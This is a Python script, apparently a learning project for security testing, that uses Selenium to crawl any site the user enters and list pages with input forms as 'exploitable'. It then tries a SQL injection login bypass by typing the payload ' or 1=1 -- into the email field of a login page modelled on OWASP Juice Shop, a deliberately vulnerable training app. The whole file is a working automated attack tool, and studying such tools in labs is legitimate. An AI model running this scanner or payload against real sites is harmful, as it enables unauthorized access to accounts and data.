from time import sleep
from random import uniform
from soup_methods import find_links, find_buttons, find_inputs
from bs4 import BeautifulSoup
from init import initialize
from difflib import SequenceMatcher
from selenium import webdriver
from selenium.webdriver.common.keys import Keys


global available
global queue

def available_links(driver,site):
    domain = site.split('.')[0]
    driver.get(site)
    sleep(2)
    home = driver.page_source
    available.add('/')
    while len(queue) != 0 : 
        link = queue[0] 
        driver.get(f'{site}{link}')
        sleep(uniform(1.3,1.7))
        page = driver.page_source
        seq = SequenceMatcher(a=home,b=page)
        ratio = seq.ratio()
        if '404' not in page and page and ratio <= 0.82:
            soup = BeautifulSoup(page,'html.parser')
            for ref in find_buttons(soup,queue,available):
                if ref not in queue and ref not in available:
                    queue.append(ref)
            for ref in find_links(soup,domain,queue,available):
                if ref not in queue and ref not in available:
                    queue.append(ref)
            available.add(queue.pop(0))
        else:
            queue.pop(0)

def check_form_val(driver,site):
    lista=[]
    for link in available:
        driver.get(f'{site}{link}')
        sleep(uniform(1.5,1.8))
        page = driver.page_source
        soup = BeautifulSoup(page,'html.parser')
        if find_inputs(soup):
            print(f'{site}{link} has inputs you can exploit')
            lista.append(link)
        else:
            print(f'{site}{link} has no input form to exploit')
    if '/login/' in  lista: #check if link has login 
        link2='/login/'
        loginsqlinjection(site,link2)



def loginsqlinjection(site,link2): #check for sql injection
    browser=webdriver.Firefox()
    browser.get(f'{site}{link2}') #open link in firefox browser
    sleep(2)
    browser.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click() #find login button
    browser.find_element_by_xpath('//*[@id="email"]').send_keys(" ' or 1=1 -- ")
    password=browser.find_element_by_xpath('//*[@id="password"]') 
    text='sqlinjection'
    for characters in text:
        password.send_keys(characters)
        sleep(0.3) #set username and password 
    browser.find_element_by_xpath('//*[@id="loginButton"]').click() 
    sleep(5)
    if browser.current_url=='https://juice-shop.herokuapp.com/#/search': #check if login failed 
          print("your page is vulnerable to sql injection")
    else:
        print("login failed")
    browser.close()


if __name__ == '__main__':
    queue = list()
    available = set()
    form_vul = set()
    driver = initialize()
    site = input('Give site full url: ')
    with open('checklist.txt','r') as file:
        lines = file.readlines()
        for line in lines:
            queue.append(line.replace('\n',''))
    available_links(driver,site)
    print('Available Ulrs: ')
    for link in available:
        print(f'---{link}')
    print('----------------- \n')
    check_form_val(driver,site)